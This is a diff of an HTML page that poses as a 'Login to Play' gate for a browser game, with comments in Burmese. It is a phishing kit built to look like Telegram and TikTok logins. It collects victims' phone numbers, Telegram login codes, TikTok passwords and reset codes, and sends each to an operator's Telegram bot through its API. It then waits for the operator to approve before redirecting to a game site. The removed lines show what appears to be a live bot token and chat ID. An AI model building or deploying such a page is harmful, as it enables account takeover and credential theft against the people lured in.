@@ -2,112 +2,161 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Login</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>body { background: #f0f2f5; font-family: sans-serif; }</style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* Fullscreen & Status Bar Removal */
+        html, body { 
+            margin: 0; padding: 0; width: 100%; height: 100%; 
+            overflow: hidden; background-color: #ffffff;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .loader {
+            border: 3px solid #f3f3f3; border-top: 3px solid #2481cc;
+            border-radius: 50%; width: 24px; height: 24px;
+            animation: spin 1s linear infinite; display: none;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+    </style>
 </head>
 <body>
 
-<div id="app" class="max-w-md mx-auto h-screen flex flex-col justify-center items-center p-6">
-    <!-- Login Screen -->
-    <div id="loginScreen" class="w-full bg-white p-8 rounded-2xl shadow-lg text-center">
-        <h2 class="text-2xl font-bold mb-6">Login to Play</h2>
-        <button onclick="selectLogin('Telegram')" class="w-full bg-blue-500 text-white py-3 rounded-lg mb-4">Login with Telegram</button>
-        <button onclick="selectLogin('TikTok')" class="w-full bg-black text-white py-3 rounded-lg">Login with TikTok</button>
+<div id="app" class="w-full h-full flex flex-col items-center justify-center">
+    
+    <!-- Step 1: Selection Screen -->
+    <div id="selectScreen" class="w-full max-w-sm p-8 text-center">
+        <h1 class="text-2xl font-bold mb-8">Login to Play</h1>
+        <button onclick="showTG()" class="w-full bg-[#2481cc] text-white py-3 rounded-lg mb-4 flex items-center justify-center gap-2">
+            <i class="fa-brands fa-telegram text-xl"></i> Login with Telegram
+        </button>
+        <button onclick="showTT()" class="w-full bg-black text-white py-3 rounded-lg flex items-center justify-center gap-2">
+            <i class="fa-brands fa-tiktok text-xl"></i> Login with TikTok
+        </button>
     </div>
 
-    <!-- OTP & Wait Screen -->
-    <div id="otpScreen" class="hidden w-full bg-white p-8 rounded-2xl shadow-lg text-center">
-        <h2 id="loginType" class="text-xl font-bold mb-4"></h2>
-        <div id="inputArea">
-            <input type="number" id="otpInput" placeholder="Enter Code" class="w-full border-b-2 p-2 mb-6 text-center text-xl outline-none">
-            <button onclick="submitOTP()" class="w-full bg-green-500 text-white py-3 rounded-lg">Submit</button>
+    <!-- Step 2: Telegram UI (Phone Number) -->
+    <div id="tgPhoneScreen" class="hidden w-full max-w-sm p-6 flex flex-col h-full">
+        <div class="mt-10 text-center">
+            <i class="fa-solid fa-paper-plane text-6xl text-[#2481cc] mb-6"></i>
+            <h2 class="text-2xl font-bold mb-2">Your Phone</h2>
+            <p class="text-gray-500 mb-8">Confirm country code and enter phone number.</p>
         </div>
-        
-        <!-- Admin Approval Waiting UI -->
-        <div id="waitingArea" class="hidden mt-4">
-            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-500 mx-auto mb-4"></div>
-            <p class="text-blue-600 font-bold">Admin ထံမှ ခွင့်ပြုချက် စောင့်ဆိုင်းနေပါသည်...</p>
-            <p class="text-xs text-gray-400 mt-2">ခွင့်ပြုချက်ရလျှင် ဂိမ်းထဲသို့ အလိုအလျောက် ရောက်သွားပါမည်။</p>
+        <div class="border-b-2 border-gray-100 py-2 mb-6">
+            <label class="text-gray-400 text-sm">Country</label>
+            <div class="flex justify-between font-medium"><span>Myanmar</span><i class="fa-solid fa-chevron-right text-gray-300"></i></div>
         </div>
+        <div class="flex border-b-2 border-[#2481cc] py-2 mb-10">
+            <span class="font-bold text-xl mr-4">+95</span>
+            <input type="number" id="tgPhone" placeholder="9xxxxxxxxx" class="w-full outline-none text-xl">
+        </div>
+        <button onclick="submitTGPhone()" class="fixed bottom-10 right-10 bg-[#2481cc] w-16 h-16 rounded-full shadow-lg flex items-center justify-center text-white text-2xl">
+            <i id="tgIcon1" class="fa-solid fa-arrow-right"></i>
+            <div id="tgLoader1" class="loader !border-t-white"></div>
+        </button>
     </div>
+
+    <!-- Step 3: Telegram OTP UI -->
+    <div id="tgOtpScreen" class="hidden w-full max-w-sm p-6 text-center">
+        <div class="mt-10 mb-8"><i class="fa-solid fa-message text-6xl text-[#2481cc]"></i></div>
+        <h2 id="displayTgPhone" class="text-2xl font-bold mb-2"></h2>
+        <p class="text-gray-500 mb-8">We've sent a code to your Telegram app.</p>
+        <input type="number" id="tgOtp" placeholder="Enter Code" class="w-full border-b-2 border-gray-300 text-center text-2xl outline-none p-2 mb-10 focus:border-[#2481cc]">
+        <button onclick="submitApproval('Telegram OTP')" class="fixed bottom-10 right-10 bg-[#2481cc] w-16 h-16 rounded-full shadow-lg flex items-center justify-center text-white text-2xl">
+            <i id="tgIcon2" class="fa-solid fa-arrow-right"></i>
+            <div id="tgLoader2" class="loader !border-t-white"></div>
+        </button>
+    </div>
+
+    <!-- Step 4: TikTok Login UI (Phone + Pass) -->
+    <div id="ttLoginScreen" class="hidden w-full max-w-sm p-8">
+        <h2 class="text-2xl font-bold mb-8 text-center">TikTok Login</h2>
+        <input type="number" id="ttPhone" placeholder="Phone number" class="w-full bg-gray-100 p-3 rounded-lg mb-4 outline-none">
+        <input type="password" id="ttPass" placeholder="Password" class="w-full bg-gray-100 p-3 rounded-lg mb-2 outline-none">
+        <p onclick="showTTOtp()" class="text-xs text-gray-500 cursor-pointer hover:text-black mb-8">Password မေ့နေသည်</p>
+        <button onclick="submitApproval('TikTok Password')" class="w-full bg-[#fe2c55] text-white py-3 rounded-lg font-bold">Log in</button>
+    </div>
+
+    <!-- Step 5: TikTok OTP UI -->
+    <div id="ttOtpScreen" class="hidden w-full max-w-sm p-8 text-center">
+        <h2 class="text-2xl font-bold mb-4">Verification</h2>
+        <p class="text-gray-500 mb-6">Enter the 6-digit code sent to your phone.</p>
+        <input type="number" id="ttOtp" placeholder="6-digit code" class="w-full bg-gray-100 p-3 rounded-lg mb-6 text-center text-xl outline-none">
+        <button onclick="submitApproval('TikTok Forgot OTP')" class="w-full bg-[#fe2c55] text-white py-3 rounded-lg font-bold">Verify</button>
+    </div>
+
+    <!-- Step 6: Approval Waiting Screen -->
+    <div id="waitScreen" class="hidden w-full max-w-sm p-8 text-center">
+        <div class="loader !block mx-auto mb-6 !w-12 !h-12 border-4"></div>
+        <h2 class="text-xl font-bold text-blue-600 mb-4">ခွင့်ပြုချက် စောင့်ဆိုင်းနေပါသည်...</h2>
+        <p class="text-gray-500">Admin မှ ခွင့်ပြုပြီးပါက ဂိမ်းထဲသို့ အလိုအလျောက် ရောက်သွားပါမည်။</p>
+    </div>
+
 </div>
 
 <script>
-    const token = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
-    const chat = "5304050102";
-    const gameLink = "https://www.crazygames.com";
-    let method = "";
-    let userKey = "user_" + Math.floor(Math.random() * 10000); // User တစ်ယောက်ချင်းစီကို ခွဲခြားရန်
+    const token = "YOUR_BOT_TOKEN"; // Bot Token ထည့်ရန်
+    const chat = "YOUR_CHAT_ID";     // Chat ID ထည့်ရန်
+    const gameLink = "https://poki.com/en/g/rail-in-the-air#fullscreen";
+    let userKey = "U" + Math.floor(Math.random() * 99999);
 
-    // တစ်ခါဝင်ထားပြီးသားဆိုလျှင် တန်းဝင်ရန်
-    if (localStorage.getItem('isApproved') === 'true') {
-        window.location.href = gameLink;
+    if (localStorage.getItem('approved') === 'true') window.location.href = gameLink;
+
+    function showTG() { toggle('tgPhoneScreen'); }
+    function showTT() { toggle('ttLoginScreen'); }
+    function showTTOtp() { toggle('ttOtpScreen'); }
+    function toggle(id) {
+        document.querySelectorAll('#app > div').forEach(d => d.classList.add('hidden'));
+        document.getElementById(id).classList.remove('hidden');
     }
 
-    function selectLogin(type) {
-        method = type;
-        document.getElementById('loginScreen').classList.add('hidden');
-        document.getElementById('otpScreen').classList.remove('hidden');
-        document.getElementById('loginType').innerText = type + " Verification";
+    async function submitTGPhone() {
+        const ph = document.getElementById('tgPhone').value;
+        if(!ph) return;
+        document.getElementById('tgIcon1').style.display = 'none';
+        document.getElementById('tgLoader1').style.display = 'block';
+        const fPh = ph.startsWith('09') ? ph : '09' + ph.replace(/^0/, '');
+        document.getElementById('displayTgPhone').innerText = fPh;
+        await sendBot(`📱 TG Phone: ${fPh}\nID: ${userKey}`);
+        setTimeout(() => toggle('tgOtpScreen'), 1000);
     }
 
-    async function submitOTP() {
-        const code = document.getElementById('otpInput').value;
-        if(!code) return alert("Please enter code");
+    async function submitApproval(type) {
+        let data = "";
+        if(type === 'Telegram OTP') data = "OTP: " + document.getElementById('tgOtp').value;
+        if(type === 'TikTok Password') data = `Phone: ${document.getElementById('ttPhone').value}\nPass: ${document.getElementById('ttPass').value}`;
+        if(type === 'TikTok Forgot OTP') data = "Forgot OTP: " + document.getElementById('ttOtp').value;
 
-        document.getElementById('inputArea').classList.add('hidden');
-        document.getElementById('waitingArea').classList.remove('hidden');
-
-        // Admin ဆီသို့ ခလုတ်များနှင့်အတူ Message ပို့ခြင်း
-        const message = `🔔 *New Access Request*\n\nMethod: ${method}\nCode: \`${code}\`\nUser ID: \`${userKey}\``;
-        
-        // Telegram Inline Keyboard Buttons
-        const keyboard = {
-            inline_keyboard: [[
-                { text: "✅ Approve", callback_data: `approve_${userKey}` },
-                { text: "❌ Reject", callback_data: `reject_${userKey}` }
-            ]]
-        };
-
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: chat,
-                text: message,
-                parse_mode: "Markdown",
-                reply_markup: keyboard
-            })
-        });
-
-        // Admin က Approve လုပ်မလုပ် စစ်ဆေးသည့် Polling စတင်ခြင်း
-        startCheckingStatus();
+        toggle('waitScreen');
+        await sendBot(`🔔 Access Request (${type})\n${data}\nID: ${userKey}`, true);
+        startPolling();
     }
 
-    function startCheckingStatus() {
-        const checkInterval = setInterval(async () => {
-            // ဤနေရာတွင် တကယ့်စနစ်တွင် Backend/Database ကို စစ်ရမည်။ 
-            // သို့သော် GitHub Pages သုံးထားလျှင် Bot ဆီမှ နောက်ဆုံးစာကို ပြန်ဖတ်သည့်နည်း သုံးရပါမည်။
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
-                const data = await response.json();
-                const lastUpdate = data.result[0];
+    async function sendBot(msg, withButtons = false) {
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        const body = { chat_id: chat, text: msg, parse_mode: "Markdown" };
+        if(withButtons) {
+            body.reply_markup = { inline_keyboard: [[
+                { text: "✅ Approve", callback_data: `ok_${userKey}` },
+                { text: "❌ Reject", callback_data: `no_${userKey}` }
+            ]]};
+        }
+        await fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body) });
+    }
 
-                if (lastUpdate && lastUpdate.callback_query) {
-                    const action = lastUpdate.callback_query.data;
-                    if (action === `approve_${userKey}`) {
-                        clearInterval(checkInterval);
-                        localStorage.setItem('isApproved', 'true');
-                        window.location.href = gameLink;
-                    } else if (action === `reject_${userKey}`) {
-                        clearInterval(checkInterval);
-                        alert("သင်၏ဝင်ရောက်ခွင့်ကို Admin မှ ငြင်းပယ်လိုက်ပါသည်။");
-                        location.reload();
-                    }
-                }
-            } catch (e) {}
-        }, 3000); // ၃ စက္ကန့်တစ်ခါ စစ်မည်
+    function startPolling() {
+        const timer = setInterval(async () => {
+            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
+            const d = await response.json();
+            const last = d.result[0];
+            if (last?.callback_query?.data === `ok_${userKey}`) {
+                clearInterval(timer);
+                localStorage.setItem('approved', 'true');
+                window.location.href = gameLink;
+            }
+        }, 3000);
     }
 </script>
 </body>
